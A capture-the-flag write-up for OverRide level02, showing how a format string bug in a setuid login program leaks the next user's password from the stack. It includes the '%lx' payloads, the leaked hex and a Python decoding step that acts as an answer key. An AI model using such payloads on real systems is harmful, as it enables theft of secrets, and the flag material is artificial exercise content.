# Level 02

- We have a program requesting a user and a password:

```console
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: 42
--[ Password: 42
*****************************************
42 does not have access!
level02@OverRide:~$
```

- Reading the disassembled code, we see a misused `printf`. We're going to use the string format vulnerability.

```console
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p
--[ Password:
*****************************************
0x7fffffffe500 does not have access!
```

- It works!
- But we notice that the address is on 8 bytes, so we're on a 64 bit program, as `file` can confirm.

```console
$ file ./level02
./level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
```

- Now we need to find a use for it. We can see that a call to `open` and `read` is made to the `.pass` of the next user at the start of the program. The contents of the file are therefore stored somewhere in memory. Let's try to find that location with the misused `printf`.

```console
$ (python -c 'print("%lx." * 25)'; echo "AAAA";) | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
7fffffffe500.0.2e.2a2a2a2a2a2a2a2a.2a2a2a2a2a2a2a2a.7fffffffe6f8.1f7ff9a08.2e.0.0.0.0.0.0.0.0.0.0.0.100000000.0.756e505234376848.45414a3561733951.377a7143574e6758.354a35686e475873 does not have access!
```

- Oh, there's something that looks more like a string than an address, but we only have 4 of 8 bytes, and the code clearly explains that the string is 40 characters long, so we're missing a byte.

```console
$ (python -c 'print("%x" * 21 + ".%lx" * 5)'; echo "AAAA";) | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
ffffe5000412a2a2a2a2a2a2a2affffe6f8f7ff9a08414141410000000000000.756e505234376848.45414a3561733951.377a7143574e6758.354a35686e475873.48336750664b394d does not have access!
```

- Now that we've got our 5 bytes, we need to transform them into our flag, so we do the big endian transformation.

```console
$ python
Python 2.7.3 (default, Jun 22 2015, 19:33:41)
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> hex_string = "48336750664b394d" + "354a35686e475873" + "377a7143574e6758" + "45414a3561733951" + "756e505234376848"
>>> byte_array = bytearray.fromhex(hex_string)
>>> result_string = byte_array.decode('utf-8')
>>> print(result_string)[::-1]
```

